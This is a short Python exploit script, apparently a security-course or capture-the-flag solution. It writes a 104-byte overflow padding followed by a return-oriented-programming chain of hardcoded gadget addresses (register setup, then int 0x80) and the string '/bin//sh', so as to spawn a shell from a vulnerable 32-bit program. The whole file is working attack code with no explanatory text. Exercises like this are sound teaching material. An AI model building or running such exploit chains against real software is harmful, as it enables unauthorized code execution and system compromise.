#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
sys.stdout.buffer.write(b'\x11'*104)

#8054355

# b *0x080488ba

# xor edx 805c363
sys.stdout.buffer.write(b'\x63\xc3\x05\x08' + b'\x22'*12) 

# xor ecx 8049a03
sys.stdout.buffer.write(b'\x03\x9a\x04\x08' + b'\x33'*4 + b'\xf5\xff\xff\xff' +b'\x22'*8) 

# mov esi, eax 804ed06
sys.stdout.buffer.write(b'\x06\xed\x04\x08' + b'\x55'*8 + b'\x5c\xcb\xfe\xff') 

# neg eax 8054355
sys.stdout.buffer.write(b'\x55\x43\x05\x08' + b'\x66'*12) 

# pop %ebx #8056016 #0xfffecba4
sys.stdout.buffer.write(b'\x16\x60\x05\x08'+ b'\xbc\xcb\xfe\xff')

# int x80
sys.stdout.buffer.write(b'\x80\xe7\x06\x08')

# datasegment
sys.stdout.buffer.write(b'\x55'*12 + b'/bin//sh')

# sys.stdout.buffer.write(b'\x55'*8 + b'\x8c\xcb\xfe\xff')